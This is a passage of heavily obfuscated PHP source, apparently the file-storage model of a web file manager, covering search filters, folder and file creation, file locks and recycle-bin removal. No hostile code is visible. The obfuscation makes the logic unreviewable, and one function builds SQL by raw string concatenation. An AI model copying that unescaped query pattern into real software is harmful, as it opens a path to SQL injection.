str_replace(array($ù“ÕŸèÃ[231], $ù“ÕŸèÃ[53], $ù“ÕŸèÃ[2114]), $ù“ÕŸèÃ[12], $¹»Â›Ô‡); $¹»Â›Ô‡ = $ù“ÕŸèÃ[438] . str_replace($ù“ÕŸèÃ[50], $ù“ÕŸèÃ[439], $¹»Â›Ô‡); $ı¡°–¡ë = $©‹ºÊ™Å[$ù“ÕŸèÃ[32]]; unset($©‹ºÊ™Å[$ù“ÕŸèÃ[32]]); foreach ($©‹ºÊ™Å as $â§¿ş–¼ => $¹ÔÀäÎÆ) { $Ì³¼ÙË[$ù“ÕŸèÃ[438] . $â§¿ş–¼] = $¹ÔÀäÎÆ; } foreach ($ı¡°–¡ë as $£¯«Áú) { $Ì³¼ÙË[] = array($ù“ÕŸèÃ[443] => $£¯«Áú, $ù“ÕŸèÃ[1000] => $ù“ÕŸèÃ[1952], array($ù“ÕŸèÃ[2115] => $£¯«Áú, $ù“ÕŸèÃ[2116] => array($ù“ÕŸèÃ[7], array($ù“ÕŸèÃ[465], $ù“ÕŸèÃ[464])))); } $this->join($©²ôÚòŸ); $©‹ºÊ™Å = $Ì³¼ÙË; } private function _parseSearchWhere($ªôŸ­·–) { $å€›Ëë =& $_SERVER[ĞÂ¤àÓï]; $œøë¥ù = array(); if (isset($ªôŸ­·–[$å€›Ëë[760]]) && $ªôŸ­·–[$å€›Ëë[760]]) { $œøë¥ù[$å€›Ëë[85]] = array($å€›Ëë[2117], $ªôŸ­·–[$å€›Ëë[760]]); } if (isset($ªôŸ­·–[$å€›Ëë[497]]) && $ªôŸ­·–[$å€›Ëë[497]]) { $›­Ì’‚ = array($å€›Ëë[2118], $ªôŸ­·–[$å€›Ëë[497]]); if ($œøë¥ù[$å€›Ëë[85]]) { $œøë¥ù[$å€›Ëë[85]] = array($œøë¥ù[$å€›Ëë[85]], $›­Ì’‚, $å€›Ëë[2119]); } else { $œøë¥ù[$å€›Ëë[85]] = $›­Ì’‚; } } if (isset($ªôŸ­·–[$å€›Ëë[2111]]) && $ªôŸ­·–[$å€›Ëë[2111]] > 0) { $œøë¥ù[$å€›Ëë[76]] = array($å€›Ëë[2117], $ªôŸ­·–[$å€›Ëë[2111]]); } if (isset($ªôŸ­·–[$å€›Ëë[2112]]) && $ªôŸ­·–[$å€›Ëë[2112]]) { $›­Ì’‚ = array($å€›Ëë[2118], $ªôŸ­·–[$å€›Ëë[2112]]); if ($œøë¥ù[$å€›Ëë[76]]) { $œøë¥ù[$å€›Ëë[76]] = array($œøë¥ù[$å€›Ëë[76]], $›­Ì’‚, $å€›Ëë[2119]); } else { $œøë¥ù[$å€›Ëë[76]] = $›­Ì’‚; } } if (isset($ªôŸ­·–[$å€›Ëë[600]]) && $ªôŸ­·–[$å€›Ëë[600]]) { $œøë¥ù[] = array($å€›Ëë[456] => $ªôŸ­·–[$å€›Ëë[600]], $å€›Ëë[454] => $ªôŸ­·–[$å€›Ëë[600]], $å€›Ëë[1000] => $å€›Ëë[1952]); } if (isset($ªôŸ­·–[$å€›Ëë[412]]) && $ªôŸ­·–[$å€›Ëë[412]]) { $Ñßù“Ã¥ = $ªôŸ­·–[$å€›Ëë[412]]; if ($Ñßù“Ã¥ == $å€›Ëë[75]) { $œøë¥ù[$å€›Ëë[410]] = 1; } else { if ($Ñßù“Ã¥ == $å€›Ëë[2120]) { $œøë¥ù[$å€›Ëë[410]] = 0; } else { if ($Ñßù“Ã¥) { $Ñßù“Ã¥ = is_array($Ñßù“Ã¥) ? $Ñßù“Ã¥ : explode($å€›Ëë[50], $Ñßù“Ã¥); $œøë¥ù[$å€›Ëë[412]] = array($å€›Ëë[418], $Ñßù“Ã¥); $œøë¥ù[$å€›Ëë[410]] = 0; } } } } $this->_parseSearchParent($ªôŸ­·–, $œøë¥ù); if (isset($ªôŸ­·–[$å€›Ëë[1948]]) && trim($ªôŸ­·–[$å€›Ëë[1948]])) { $®Ê¬¼¹Á = trim($ªôŸ­·–[$å€›Ëë[1948]]); $ã¼æè®¦ = explode($å€›Ëë[53], $®Ê¬¼¹Á); if (strlen($®Ê¬¼¹Á) > 2 && (substr($®Ê¬¼¹Á, 0, 1) == $å€›Ëë[118] && substr($®Ê¬¼¹Á, -1) == $å€›Ëë[118]) || substr($®Ê¬¼¹Á, 0, 1) == $å€›Ëë[58] && substr($®Ê¬¼¹Á, -1) == $å€›Ëë[58]) { $®Ê¬¼¹Á = substr($®Ê¬¼¹Á, 1, -1); $ã¼æè®¦ = array($®Ê¬¼¹Á); } $œøë¥ù[$å€›Ëë[32]] = array(array($å€›Ëë[550], $å€›Ëë[1950] . $®Ê¬¼¹Á . $å€›Ëë[1950])); if (count($ã¼æè®¦) > 1) { $œøë¥ù[$å€›Ëë[32]] = array(); foreach ($ã¼æè®¦ as $ø¼×ƒÉ®) { if (!trim($ø¼×ƒÉ®)) { continue; } $œøë¥ù[$å€›Ëë[32]][] = array($å€›Ëë[550], $å€›Ëë[1950] . trim($ø¼×ƒÉ®) . $å€›Ëë[1950]); } } } return $œøë¥ù; } private function _parseSearchParent($Åîº€‰, &$ìî«°†²) { $¶×·ÉÎœ =& $_SERVER[ĞÂ¤àÓï]; if (!isset($Åîº€‰[$¶×·ÉÎœ[432]]) || !$Åîº€‰[$¶×·ÉÎœ[432]]) { return; } $ÆİûÜ™ß = $this->pathInfo($Åîº€‰[$¶×·ÉÎœ[432]]); $–éÌ­çÁ = $ÆİûÜ™ß[$¶×·ÉÎœ[432]] . $¶×·ÉÎœ[12] === $¶×·ÉÎœ[197]; $ ÇÂ½¿æ = $ÆİûÜ™ß[$¶×·ÉÎœ[411]] == $¶×·ÉÎœ[515]; if ($ÆİûÜ™ß[$¶×·ÉÎœ[532]] == $¶×·ÉÎœ[533]) { $«˜Áø‚Ç = $this->sourceInfo($Åîº€‰[$¶×·ÉÎœ[432]]); $ÆİûÜ™ß[$¶×·ÉÎœ[521]] = $«˜Áø‚Ç[$¶×·ÉÎœ[521]]; } $ìî«°†²[$¶×·ÉÎœ[590]] = array($¶×·ÉÎœ[550], $ÆİûÜ™ß[$¶×·ÉÎœ[521]] . $Åîº€‰[$¶×·ÉÎœ[432]] . $¶×·ÉÎœ[551]); $ŒóùõÑ´ = isset($Åîº€‰[$¶×·ÉÎœ[1813]]) && in_array($¶×·ÉÎœ[515], $Åîº€‰[$¶×·ÉÎœ[1813]]); if (!$ŒóùõÑ´ || !$ ÇÂ½¿æ || !$–éÌ­çÁ || !$ÆİûÜ™ß[$¶×·ÉÎœ[413]]) { return; } if (!AuthModel::authCheckRoot($ÆİûÜ™ß[$¶×·ÉÎœ[413]][$¶×·ÉÎœ[414]])) { return; } $¶ˆ‚³´§ = $ÆİûÜ™ß[$¶×·ÉÎœ[505]] . $¶×·ÉÎœ[12]; if ($¶ˆ‚³´§ == $¶×·ÉÎœ[88]) { unset($ìî«°†²[$¶×·ÉÎœ[590]]); $ìî«°†²[$¶×·ÉÎœ[411]] = self::TYPE_GROUP; return; } $Š—ÙéÛÜ = Model($¶×·ÉÎœ[522])->groupChildrenAll($¶ˆ‚³´§); $ñ«ò»å = count($Š—ÙéÛÜ); if ($ñ«ò»å <= 1) { return; } $±Ã¢ÛŠë = array($¶×·ÉÎœ[432] => 0, $¶×·ÉÎœ[411] => self::TYPE_GROUP, $¶×·ÉÎœ[505] => array($¶×·ÉÎœ[7], $Š—ÙéÛÜ)); $Ú•—¹ëŞ = $this->field($¶×·ÉÎœ[2121])->where($±Ã¢ÛŠë)->limit($ñ«ò»å)->select(); $ìî«°†²[$¶×·ÉÎœ[590]] = array(); foreach ($Ú•—¹ëŞ as $È••Ö½ø) { $ìî«°†²[$¶×·ÉÎœ[590]][] = array($¶×·ÉÎœ[550], $¶×·ÉÎœ[531] . $È••Ö½ø[$¶×·ÉÎœ[402]] . $¶×·ÉÎœ[551]); } $ìî«°†²[$¶×·ÉÎœ[590]][] = $¶×·ÉÎœ[1952]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($ÇÙöëí) { $èÁ‚©›† =& $_SERVER[ĞÂ¤àÓï]; $¿Ê€Ùê = Model($èÁ‚©›†[513])->where(array($èÁ‚©›†[1655] => $ÇÙöëí))->find(); $ÅàÙÛ¼Ù = $this->_mkdirRoot(SourceModel::TYPE_USER, $ÇÙöëí, $¿Ê€Ùê[$èÁ‚©›†[32]]); $this->userDesktopAdd($ÅàÙÛ¼Ù); return $ÅàÙÛ¼Ù; } public function userDesktopAdd($‹Ë §¤ö) { $Œ¢éôÔ =& $_SERVER[ĞÂ¤àÓï]; $ÀîŒ†Ë‘ = LNG($Œ¢éôÔ[2122]); $ ¥º´—¿ = $this->mkdir($‹Ë §¤ö, $ÀîŒ†Ë‘); $this->metaSet($ ¥º´—¿, $Œ¢éôÔ[2123], $Œ¢éôÔ[88]); $this->metaSet($‹Ë §¤ö, $Œ¢éôÔ[2124], $ ¥º´—¿); } public function userPathSafeAdd($¼«¯¡Ã´) { $Í¾Çßç¹ =& $_SERVER[ĞÂ¤àÓï]; $ôùıÃ£› = Model($Í¾Çßç¹[513])->getInfoFull($¼«¯¡Ã´); if (!$ôùıÃ£›) { return !1; } if (_get($ôùıÃ£›, $Í¾Çßç¹[536])) { return $ôùıÃ£›[$Í¾Çßç¹[466]][$Í¾Çßç¹[2125]]; } $°ŒË’£ = $this->_mkdirRoot(SourceModel::TYPE_USER, $¼«¯¡Ã´, $Í¾Çßç¹[2126], $Í¾Çßç¹[433]); Model($Í¾Çßç¹[513])->metaSet($¼«¯¡Ã´, $Í¾Çßç¹[2125], $°ŒË’£); $this->metaSet($°ŒË’£, $Í¾Çßç¹[2127], $¼«¯¡Ã´); return $°ŒË’£; } public function groupRootAdd($ëı”¤°) { $»±Û—‘Ê =& $_SERVER[ĞÂ¤àÓï]; $º³õÛé² = Model($»±Û—‘Ê[522])->where(array($»±Û—‘Ê[1942] => $ëı”¤°))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ëı”¤°, $º³õÛé²[$»±Û—‘Ê[32]]); } public function systemRootPathAdd($ß§ÖÏ÷ó) { if ($ß§ÖÏ÷ó != $_SERVER[ĞÂ¤àÓï][544]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $ß§ÖÏ÷ó); } public function userRootRemove($®µ¼«î¡) { $Â„÷ÚŞû = $this->targetSourceRoot(SourceModel::TYPE_USER, $®µ¼«î¡, !0); foreach ($Â„÷ÚŞû as $Ã×À®Å) { if (!$Ã×À®Å) { continue; } $this->remove($Ã×À®Å[$_SERVER[ĞÂ¤àÓï][402]], !1); } } public function groupRootRemove($Şèƒìğ´) { $ ŠÚä•û = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $Şèƒìğ´); if (!$ ŠÚä•û) { return; } $this->remove($ ŠÚä•û[$_SERVER[ĞÂ¤àÓï][402]], !1); } private function _mkdirRoot($“ñÑİÍË, $ãÜ‘õÓ, $›ÙË‰ı¨, $ò¿ã’ˆ¤ = '') { $Ú¥Äô»İ =& $_SERVER[ĞÂ¤àÓï]; $¸§·Ñšì = array($Ú¥Äô»İ[401] => 0, $Ú¥Äô»İ[586] => $“ñÑİÍË, $Ú¥Äô»İ[587] => $ãÜ‘õÓ, $Ú¥Äô»İ[583] => 1, $Ú¥Äô»İ[588] => USER_ID, $Ú¥Äô»İ[589] => USER_ID, $Ú¥Äô»İ[584] => $ò¿ã’ˆ¤, $Ú¥Äô»İ[590] => $Ú¥Äô»İ[531], $Ú¥Äô»İ[430] => 0, $Ú¥Äô»İ[585] => 0, $Ú¥Äô»İ[469] => 0, $Ú¥Äô»İ[591] => $Ú¥Äô»İ[12]); if ($š¤±ô¡ = $this->where($¸§·Ñšì)->find()) { return $š¤±ô¡[$Ú¥Äô»İ[402]]; } $²ÇòÓ¢¬ = "\x4d\x6f\x64\x65\x6c\123\x6f\x75\162\x63\x65\56\155\x6b\144\151\x72\x52\157\x6f\164\56{$“ñÑİÍË}\56{$ãÜ‘õÓ}\56" . $›ÙË‰ı¨; CacheLock::lock($²ÇòÓ¢¬); $¸§·Ñšì[$Ú¥Äô»İ[32]] = $›ÙË‰ı¨; $Ä·¦¼ˆ‹ = $this->add($¸§·Ñšì); $ìËô¢šë = array($Ú¥Äô»İ[592] => short_id($Ä·¦¼ˆ‹)); $this->where(array($Ú¥Äô»İ[417] => $Ä·¦¼ˆ‹))->save($ìËô¢šë); CacheLock::unlock($²ÇòÓ¢¬); return $Ä·¦¼ˆ‹; } private function targetSourceRoot($¿ÃĞ½œœ, $Ğ¤‹œÛº, $í£›… = false) { $á‡µœ°’ =& $_SERVER[ĞÂ¤àÓï]; $÷³Ë¤Ÿ = array($á‡µœ°’[401] => 0, $á‡µœ°’[586] => $¿ÃĞ½œœ, $á‡µœ°’[587] => $Ğ¤‹œÛº); if ($í£›…) { $æÑş«ÆÊ = $this->where($÷³Ë¤Ÿ)->select(); return $æÑş«ÆÊ ? $æÑş«ÆÊ : array(); } $‰°öºù = $this->where($÷³Ë¤Ÿ)->find(); return $‰°öºù ? $‰°öºù : array(); } public function sourceRootGroup($—¼ê ) { $÷Šœ¸Æ =& $_SERVER[ĞÂ¤àÓï]; if (is_string($—¼ê )) { $—¼ê  = array($—¼ê ); } $–ÂêÛôŞ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $—¼ê , $÷Šœ¸Æ[188]); $­áİ§‡® = array($÷Šœ¸Æ[369] => $–ÂêÛôŞ, $÷Šœ¸Æ[366] => array($÷Šœ¸Æ[758] => count($—¼ê ))); $this->_listDataApply($­áİ§‡®[$÷Šœ¸Æ[369]]); $this->_listMake($­áİ§‡®); return array_to_keyvalue($­áİ§‡®[$÷Šœ¸Æ[82]], $÷Šœ¸Æ[505]); } public function mkfile($óÏ•öÈ, $ÛŒÒ‰ª™, $éã¹úÕ = '', $ğÄ½õ õ = REPEAT_RENAME) { $›»›Ì‚ñ =& $_SERVER[ĞÂ¤àÓï]; $°…˜ğî¶ = Model($›»›Ì‚ñ[609])->addFileByContent($éã¹úÕ, $ÛŒÒ‰ª™); return $this->_createFileCall($óÏ•öÈ, $ÛŒÒ‰ª™, $°…˜ğî¶, $ğÄ½õ õ, $›»›Ì‚ñ[1347]); } public function addFile($äİ£˜Ô”, $’ÊÄ‚±Ò, $¡â˜Ù„Ä, $…´‚Î¦ë = false, $©ËÙİ‚ = REPEAT_RENAME) { $í‹Ä¬ô = Model($_SERVER[ĞÂ¤àÓï][609])->addFile($’ÊÄ‚±Ò, $¡â˜Ù„Ä, $…´‚Î¦ë); return $this->_createFileCall($äİ£˜Ô”, $¡â˜Ù„Ä, $í‹Ä¬ô, $©ËÙİ‚); } public function addFileByFileID($Ö‘¬ææß, $‘Å‡¨”Ù, $«ë‹‘«Ê, $ıÛË±ñ¼ = REPEAT_RENAME) { $¡­Ä¯Ö¤ =& $_SERVER[ĞÂ¤àÓï]; $‰ÇÇÔµ = Model($¡­Ä¯Ö¤[609])->find($‘Å‡¨”Ù); Model($¡­Ä¯Ö¤[609])->linkAdd($‘Å‡¨”Ù); return $this->_createFileCall($Ö‘¬ææß, $«ë‹‘«Ê, $‰ÇÇÔµ, $ıÛË±ñ¼); } public function addFileByRemote($Î„¯«ºâ, $Ò§ìÇ¤è, $ÉæØĞŞ, $ó­ˆ•à‘ = array(), $« ˆ²Ñç = REPEAT_RENAME) { $´ØÀ‹Ô« = Model($_SERVER[ĞÂ¤àÓï][609])->addFileByRemote($Ò§ìÇ¤è, $ÉæØĞŞ, $ó­ˆ•à‘); return $this->_createFileCall($Î„¯«ºâ, $ÉæØĞŞ, $´ØÀ‹Ô«, $« ˆ²Ñç); } private function _createFileCall($ÃœãäŒ¡, $ı‘¶áí÷, $¶ù§ÊÁü, $ÙıºâĞ’, $‚Ö˜™‹ = "\x75\x70\x6c\x6f\x61\144") { $Â§¤ŒµÕ =& $_SERVER[ĞÂ¤àÓï]; $„¹¸¾é‚ = !1; $this->setMasterDB(); $this->lockWriteStart($ÃœãäŒ¡, $ı‘¶áí÷); $ÎŠÈàèÔ = $this->fileNameExist($ÃœãäŒ¡, $ı‘¶áí÷); $Ş‘±É¹Ê = $this->_createFile($ÃœãäŒ¡, $ı‘¶áí÷, $¶ù§ÊÁü, $ÙıºâĞ’, $„¹¸¾é‚); if (!$„¹¸¾é‚) { Model($Â§¤ŒµÕ[471])->remove($¶ù§ÊÁü[$Â§¤ŒµÕ[468]]); } if ($„¹¸¾é‚ && $Ş‘±É¹Ê && $Ş‘±É¹Ê != $ÎŠÈàèÔ) { Model($Â§¤ŒµÕ[2095])->eventCreate($Ş‘±É¹Ê, $‚Ö˜™‹); } $this->lockWriteEnd($ÃœãäŒ¡, $ı‘¶áí÷); return $Ş‘±É¹Ê; } public function mkdir($Ë´ÚÉ¾, $ôÆ¦Ò†, $òÖÈÉÛÊ = REPEAT_SKIP) { $‹ØòÔü± =& $_SERVER[ĞÂ¤àÓï]; $this->setMasterDB(); $¨˜ÊüÏÅ = $this->sourceInfo($Ë´ÚÉ¾); if (!$¨˜ÊüÏÅ) { return !1; } $this->lockWriteStart($Ë´ÚÉ¾, $ôÆ¦Ò†); if ($òÖÈÉÛÊ !== !1) { $›ÄÔÉ— = $this->fileNameExist($Ë´ÚÉ¾, $ôÆ¦Ò†); if ($›ÄÔÉ— && $òÖÈÉÛÊ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($Ë´ÚÉ¾, $ôÆ¦Ò†); return $›ÄÔÉ—; } $ôÆ¦Ò† = $this->fileNameAuto($Ë´ÚÉ¾, $ôÆ¦Ò†, $òÖÈÉÛÊ); } $‹Á˜áİñ = array($‹ØòÔü±[583] => 1, $‹ØòÔü±[420] => $ôÆ¦Ò†, $‹ØòÔü±[584] => $‹ØòÔü±[12], $‹ØòÔü±[469] => 0, $‹ØòÔü±[585] => 0); $ô›şß·Ò = $this->_addSource($‹Á˜áİñ, $¨˜ÊüÏÅ); Model($‹ØòÔü±[2095])->eventCreate($ô›şß·Ò, $‹ØòÔü±[1348]); $this->lockWriteEnd($Ë´ÚÉ¾, $ôÆ¦Ò†); return $ô›şß·Ò; } public function listSourceRoot($‚ÜÇÎóÄ, $ıŞ‰ŞÁî, $©˜Õ›ÇÖ = "\x73\157\x75\162\143\x65\111\104\54\x74\141\x72\x67\145\164\111\x44\x2c\163\x69\x7a\x65") { $È²åÜŸÉ =& $_SERVER[ĞÂ¤àÓï]; $ìÚ…¸ = $È²åÜŸÉ[378]; $¨ÅİìÈ™ = array(); $¦³ã³ï = 1024 * 50; $ùÕ£ßİÁ = is_array($ùÕ£ßİÁ) ? $ùÕ£ßİÁ : array(); $” Ò¿§‰ = count($ıŞ‰ŞÁî); $Á§õëÜğ = $this->tablePrefix . $È²åÜŸÉ[2128]; for ($ùµÈÇ½³ = 0; $ùµÈÇ½³ < $” Ò¿§‰; $ùµÈÇ½³++) { $€´¾®¨é = $ıŞ‰ŞÁî[$ùµÈÇ½³]; $ìÚ…¸ .= "\x53\105\114\105\x43\x54\x20\52\40\x46\x52\x4f\115\40\50\123\x45\x4c\105\103\124\x20{$©˜Õ›ÇÖ}\40\x46\x52\x4f\115\40\x60{$Á§õëÜğ}\140\x20\127\110\105\122\x45\40"; $ìÚ…¸ .= "\x60\160\141\162\x65\x6e\x74\x49\104\140\x3d\60\40\101\116\104\40\x60\164\141\x72\147\145\x74\111\x44\x60\x3d{$€´¾®¨é}\x20\101\116\x44\x20\x60\164\141\162\147\145\x74\x54\x79\160\x65\x60\75{$‚ÜÇÎóÄ}\x20\x61\156\x64\40\146\x69\x6c\x65\x54\171\x70\145\75\47\x27\40\x6c\x69\x6d\x69\x74\40\61\x29\40\x61\x73\40\x74\x62\137{$ùµÈÇ½³}\x20\x55\116\111\117\x4e\x20\x41\114\114\x20"; if ((strlen($ìÚ…¸) >= $¦³ã³ï || $ùµÈÇ½³ == $” Ò¿§‰ - 1) && $ìÚ…¸) { $ìÚ…¸ = substr($ìÚ…¸, 0, -strlen($È²åÜŸÉ[1038])); $ßûòÒÈ = $this->query($ìÚ…¸); $ìÚ…¸ = $È²åÜŸÉ[12]; $¨ÅİìÈ™ = array_merge($¨ÅİìÈ™, $ßûòÒÈ); } } return $¨ÅİìÈ™; } private function _createFile($«Ø·Áì, $÷¬—á£œ, $«Áô¨´®, $±ŸªÄ², &$©Ğá•ı) { $üåœ¤íé =& $_SERVER[ĞÂ¤àÓï]; $è¶¼å¨µ = $this->sourceInfo($«Ø·Áì); if (!$«Áô¨´® || !$è¶¼å¨µ) { return !1; } if ($±ŸªÄ² !== !1) { $çï†Ãàº = $this->fileNameExist($«Ø·Áì, $÷¬—á£œ); } $©Ğá•ı = !0; if ($±ŸªÄ² && $çï†Ãàº) { if ($±ŸªÄ² == REPEAT_SKIP) { $©Ğá•ı = !1; return $çï†Ãàº; } else { if ($±ŸªÄ² == REPEAT_REPLACE) { $òˆÜ£îÂ = $this->sourceInfo($çï†Ãàº); $ĞÙ•œÀ” = $this->fileHistory($òˆÜ£îÂ, $«Áô¨´®[$üåœ¤íé[468]], $«Áô¨´®[$üåœ¤íé[76]]); if (!$ĞÙ•œÀ”) { $©Ğá•ı = !1; } else { $this->folderSizeReset($«Ø·Áì); } return $çï†Ãàº; } else { $÷¬—á£œ = $this->fileNameAuto($«Ø·Áì, $÷¬—á£œ, $±ŸªÄ², !1); } } } $éªé¨ = array($üåœ¤íé[583] => 0, $üåœ¤íé[420] => $÷¬—á£œ, $üåœ¤íé[584] => substr(get_path_ext($÷¬—á£œ), 0, 10), $üåœ¤íé[469] => $«Áô¨´®[$üåœ¤íé[468]], $üåœ¤íé[585] => $«Áô¨´®[$üåœ¤íé[76]]); $õŞ­èĞÉ = $this->_addSource($éªé¨, $è¶¼å¨µ); $this->folderSizeReset($«Ø·Áì, intval($éªé¨[$üåœ¤íé[76]])); return $õŞ­èĞÉ; } protected function fileHistory($»Ì˜”ô‘, $­óå¥ø, $üšõ››¨) { $ëñ‘¥™¯ =& $_SERVER[ĞÂ¤àÓï]; $‹¥í×½ø = defined($ëñ‘¥™¯[475]) ? USER_ID : $ëñ‘¥™¯[197]; if ($»Ì˜”ô‘[$ëñ‘¥™¯[468]] == $­óå¥ø) { return !1; } $this->checkLock($»Ì˜”ô‘[$ëñ‘¥™¯[402]], $­óå¥ø); Model($ëñ‘¥™¯[2129])->addHistory($»Ì˜”ô‘); $‘ñËİ â = array($ëñ‘¥™¯[589] => $‹¥í×½ø, $ëñ‘¥™¯[424] => time(), $ëñ‘¥™¯[468] => $­óå¥ø, $ëñ‘¥™¯[76] => $üšõ››¨); $this->where(array($ëñ‘¥™¯[417] => $»Ì˜”ô‘[$ëñ‘¥™¯[402]]))->save($‘ñËİ â); $this->sourceCacheClear($»Ì˜”ô‘[$ëñ‘¥™¯[402]]); return !0; } public function checkLock($Ä²©†Ğş, $¯Ô²‡ü¤) { $¬»İ½È· =& $_SERVER[ĞÂ¤àÓï]; $ˆ·õé­½ = $this->pathInfo($Ä²©†Ğş); if (!$this->fileIsLock($ˆ·õé­½, !0)) { return; } $Ñìå…½· = Session::get($¬»İ½È·[2130]); $ò¯¬Ò¨ö = substr($ˆ·õé­½[$¬»İ½È·[32]], 0, -1 - strlen($ˆ·õé­½[$¬»İ½È·[174]])) . $¬»İ½È·[1209] . $Ñìå…½· . $¬»İ½È·[10] . $ˆ·õé­½[$¬»İ½È·[174]]; $²ÓÚ÷—› = Model($¬»İ½È·[609])->find($¯Ô²‡ü¤); $this->_createFileCall($ˆ·õé­½[$¬»İ½È·[432]], $ò¯¬Ò¨ö, $²ÓÚ÷—›, REPEAT_REPLACE, $¬»İ½È·[1347]); $Èƒš½¡ = $ˆ·õé­½[$¬»İ½È·[466]][$¬»İ½È·[548]]; $ı®Êè¾€ = $Èƒš½¡[$¬»İ½È·[542]] ? $Èƒš½¡[$¬»İ½È·[542]] : $Èƒš½¡[$¬»İ½È·[32]]; show_json(LNG($¬»İ½È·[2131]) . $¬»İ½È·[2132] . LNG($¬»İ½È·[2133]) . $¬»İ½È·[2134] . $ı®Êè¾€ . $¬»İ½È·[2135], !1); } public function fileIsLock($•í³¾Ù, $Œ¼ë…ÈØ = false) { $ö‡¨íš× =& $_SERVER[ĞÂ¤àÓï]; if (!isset($•í³¾Ù[$ö‡¨íš×[466]]) || !$•í³¾Ù[$ö‡¨íš×[466]][$ö‡¨íš×[545]]) { return !1; } if ($•í³¾Ù[$ö‡¨íš×[466]][$ö‡¨íš×[545]] != USER_ID) { return !0; } $Ã´ˆ™Øñ = $GLOBALS[$ö‡¨íš×[6]][$ö‡¨íš×[89]][$ö‡¨íš×[546]]; if ($•í³¾Ù[$ö‡¨íš×[466]][$ö‡¨íš×[547]] <= time() - $Ã´ˆ™Øñ) { $this->metaSet($•í³¾Ù[$ö‡¨íš×[402]], $ö‡¨íš×[545], null); $this->metaSet($•í³¾Ù[$ö‡¨íš×[402]], $ö‡¨íš×[547], null); } if ($Œ¼ë…ÈØ) { $this->metaSet($•í³¾Ù[$ö‡¨íš×[402]], $ö‡¨íš×[547], time()); } return !1; } private function _addSource($§õü¼Ã—, $·ê³¦‚¨) { $í•ä¼¹º =& $_SERVER[ĞÂ¤àÓï]; $Í™Êª … = defined($í•ä¼¹º[475]) ? USER_ID : $í•ä¼¹º[197]; $Ï‰Ÿšê¯ = array($í•ä¼¹º[586] => $·ê³¦‚¨[$í•ä¼¹º[411]], $í•ä¼¹º[587] => $·ê³¦‚¨[$í•ä¼¹º[505]], $í•ä¼¹º[588] => $Í™Êª …, $í•ä¼¹º[589] => $Í™Êª …, $í•ä¼¹º[401] => $·ê³¦‚¨[$í•ä¼¹º[402]], $í•ä¼¹º[590] => $·ê³¦‚¨[$í•ä¼¹º[521]] . $·ê³¦‚¨[$í•ä¼¹º[402]] . $í•ä¼¹º[50], $í•ä¼¹º[430] => 0, $í•ä¼¹º[591] => $í•ä¼¹º[12]); $§õü¼Ã— = array_merge($Ï‰Ÿšê¯, $§õü¼Ã—); $this->updateModifyTime($§õü¼Ã—[$í•ä¼¹º[432]]); $¬æØ“« = $í•ä¼¹º[2136] . $·ê³¦‚¨[$í•ä¼¹º[402]]; if (isset(self::$cacheChildList[$¬æØ“«])) { unset(self::$cacheChildList[$¬æØ“«]); } static $È÷‰Äé = false; if (!$È÷‰Äé) { Hook::trigger($í•ä¼¹º[573], $§õü¼Ã—); $È÷‰Äé = !0; } $¤Â°è·Û = $this->add($§õü¼Ã—); $ï±¯Ëñª = array($í•ä¼¹º[592] => short_id($¤Â°è·Û)); $this->where(array($í•ä¼¹º[417] => $¤Â°è·Û))->save($ï±¯Ëñª); $this->setNamePinyin($¤Â°è·Û, $§õü¼Ã—[$í•ä¼¹º[32]]); return $¤Â°è·Û; } public function remove($çßÀ«€·, $°îû¤’Ï = true) { $œÅı±Ëô =& $_SERVER[ĞÂ¤àÓï]; $ª·Õ¥¸­ = $this->sourceInfo($çßÀ«€·); $„ÍÄõ®í = intval($ª·Õ¥¸­[$œÅı±Ëô[411]]) === self::TYPE_SYSTEM; $¿¿ß´¨ü = Model($œÅı±Ëô[435])->get($œÅı±Ëô[2137]) == $œÅı±Ëô[88]; if ($„ÍÄõ®í || $°îû¤’Ï || !$¿¿ß´¨ü) { return $this->removeNow($çßÀ«€·, $°îû¤’Ï); } $½Â‰ÇÌó = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $£àñÕ¡‹ = $ª·Õ¥¸­[$œÅı±Ëô[411]] == self::TYPE_USER ? $œÅı±Ëô[600] : $œÅı±Ëô[515]; if ($£àñÕ¡‹ == $œÅı±Ëô[600]) { $ÓÉò˜İ‘ = Model($œÅı±Ëô[513])->getInfo($ª·Õ¥¸­[$œÅı±Ëô[505]]); $Ñé“Âùé = !empty($ÓÉò˜İ‘[$œÅı±Ëô[542]]) ? $ÓÉò˜İ‘[$œÅı±Ëô[542]] : $ÓÉò˜İ‘[$œÅı±Ëô[32]]; $Ñé“Âùé = $œÅı±Ëô[260] . $Ñé“Âùé . $œÅı±Ëô[2138] . $ª·Õ¥¸­[$œÅı±Ëô[505]]; } else { $ÓÉò˜İ‘ = Model($œÅı±Ëô[522])->getInfo($ª·Õ¥¸­[$œÅı±Ëô[505]]); $Ñé“Âùé = _get($ÓÉò˜İ‘, $œÅı±Ëô[32]); $Ñé“Âùé = $œÅı±Ëô[162] . $Ñé“Âùé . $œÅı±Ëô[2139] . $ª·Õ¥¸­[$œÅı±Ëô[505]]; } $™’…«¢È = $œÅı±Ëô[2140] . md5($Ñé“Âùé); CacheLock::lock($™’…«¢È); $æ³úÙ¡ = $this->fileNameExist($½Â‰ÇÌó, $Ñé“Âùé); if (!$æ³úÙ¡) { $æ³úÙ¡ = $this->mkdir($½Â‰ÇÌó, $Ñé“Âùé, REPEAT_SKIP); $this->metaSet($æ³úÙ¡, $œÅı±Ëô[2141], $£àñÕ¡‹); $this->metaSet($æ³úÙ¡, $œÅı±Ëô[2142], $ª·Õ¥¸­[$œÅı±Ëô[505]]); if ($ª·Õ¥¸­[$œÅı±Ëô[432]] != 0) { $this->metaSet($æ³úÙ¡, $œÅı±Ëô[2143], _get($ÓÉò˜İ‘, $œÅı±Ëô[2144])); } } CacheLock::unlock($™’…«¢È); $this->metaSet($çßÀ«€·, $œÅı±Ëô[2145], $ª·Õ¥¸­[$œÅı±Ëô[432]]); $this->where(array($œÅı±Ëô[402] => $çßÀ«€·))->save(array($œÅı±Ëô[424] => time())); $this->recycleClear($ª·Õ¥¸­); $ïÑ™â²Ğ = $this->move($çßÀ«€·, $æ³úÙ¡, REPEAT_RENAME_FOLDER); $this->folderSizeReset($ª·Õ¥¸­[$œÅı±Ëô[432]]); return 